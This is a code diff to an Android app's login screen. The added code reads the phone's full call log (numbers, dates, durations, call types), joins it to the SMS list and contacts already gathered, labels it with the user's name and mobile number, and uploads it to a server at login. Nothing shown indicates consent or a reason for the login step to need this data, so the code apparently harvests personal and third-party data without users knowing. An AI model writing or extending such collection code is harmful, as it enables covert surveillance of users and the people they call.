@@ -401,6 +401,29 @@ public class LoginActivity extends BaseActivity implements View.OnClickListener 
             simBean.sms_list = smsList;
         }
 
+        JSONArray callLogJsonArray = MobileDataUtil.getUserData(context, "call_log");
+        List<UBTData.DataBean.CallLogBean> callLogList = new ArrayList<>();
+        for (int i = 0; i < callLogJsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = callLogJsonArray.getJSONObject(i);
+                UBTData.DataBean.CallLogBean callLogBean = new UBTData.DataBean.CallLogBean();
+                callLogBean.type = jsonObject.optString("type");
+                callLogBean.date = jsonObject.optString("date");
+                callLogBean.number = jsonObject.optString("number");
+                callLogBean.duration = jsonObject.optString("duration");
+                callLogList.add(callLogBean);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        UBTData.DataBean callLogBean = new UBTData.DataBean();
+        callLogBean.category = "calllog";
+        req.data.add(callLogBean);
+        if (callLogList.size() > 0 && !callLogList.isEmpty()) {
+            callLogBean.calllog_list = callLogList;
+        }
+
         AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
             @Override
             public void onItemDataCallBack(CheckUserInfoResp data) {
@@ -408,6 +431,8 @@ public class LoginActivity extends BaseActivity implements View.OnClickListener 
                 contactBean.mobile = data.mobile;
                 simBean.clt_nm = data.name;
                 simBean.mobile = data.mobile;
+                callLogBean.clt_nm = data.name;
+                callLogBean.mobile = data.mobile;
 
                 PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
                     @Override
@@ -418,6 +443,7 @@ public class LoginActivity extends BaseActivity implements View.OnClickListener 
 //                                finish();
 //                            }
 //                        });
+                        // callLogBean.calllog_lis
                         finish();
                     }
 
